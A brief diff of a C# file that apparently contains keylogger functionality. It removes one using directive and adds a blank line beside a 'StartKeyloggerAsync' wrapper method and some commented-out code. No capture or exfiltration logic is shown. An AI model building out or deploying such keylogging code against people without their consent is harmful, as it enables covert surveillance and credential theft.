@@ -4,7 +4,6 @@
     using System.Collections.Generic;
     using System.Diagnostics;
     using System.Runtime.InteropServices;
-    using System.Security.Principal;
     using System.Text;
     using System.Threading;
     using System.Threading.Tasks;
@@ -1944,6 +1943,7 @@
 
         public static Task StartKeyloggerAsync() =>
             Task.Factory.StartNew(() => StartKeylogger());
+
         //{
         //    Console.WriteLine("Starting keylogger...");
 
